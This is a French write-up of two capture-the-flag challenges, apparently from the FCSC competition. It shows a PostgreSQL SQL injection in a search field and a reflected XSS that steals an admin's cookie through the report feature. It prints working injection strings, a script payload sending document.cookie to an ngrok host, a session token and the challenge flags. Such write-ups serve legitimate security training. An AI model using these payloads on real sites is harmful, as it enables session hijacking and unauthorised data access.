Chapristi 1/2

Le but est de trouver un meme caché, il y a un champ search sur la page d’accueil. Si je tente de mettre test avec une quote, un message d’erreur apparaît, pq indique que la base de données est en PostgreSQL.

Avec le payload test'--, j’obtiens une erreur de syntaxe à la fin de l’input.

Si j’essaye d’afficher tous les mêmes du site avec le payload test' or 1=1--, j’obtiens le même retour. Et si j’ajoute une ) à la fin de l’input pour casser le contexte, le flag s’affiche.

FCSC{1D32671928B0DFD5E0B92B57871B1D49}

Gare au gorille

Sur la page d’accueil, le champ search est vulnérable à une XSS reflected avec le payload <script>alert('XSS')</script>

Il y a aussi la possibilité de report un flag à l’admin en cliquant sur le drapeau de course d’un meme

Seul l’admin a la possibilité d’ajouter un meme

Mise en place de ngrok pour voler le token de l’admin

Ngrok est une application multiplateforme qui expose les ports des serveurs locaux à l’Internet. C’est facile à configurer, il suffit de deux minutes et la documentation. Exposition du port 4444 avec python et setup de ngrok.

Pour récupérer le token de l’administrateur, je vais créer un fichier file.php basique.

<?php
$cookie = $_GET["cookie"];
?>

Avec cookie editor, on peut voir que la valeur de notre token est la suivante HV6nHr2m6TYGOOaFtikDwlWRC9FLjtAVer5bzkCEvNSM8kgH7w82BD4zUdflWIwR.

Récupération du cookie de l’administrateur avec le payload suivant dans l’URL https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=

<script>window.location=`https://a6d5-90-39-121-143.eu.ngrok.io/file.php?cookie=${document.cookie}`</script>

Dans ngrok inspect, on retrouve le token de l’admin

Modification du cookie et actualisation de la page

Pour récupérer le flag, il suffit de cliquer sur Ajouter un meme
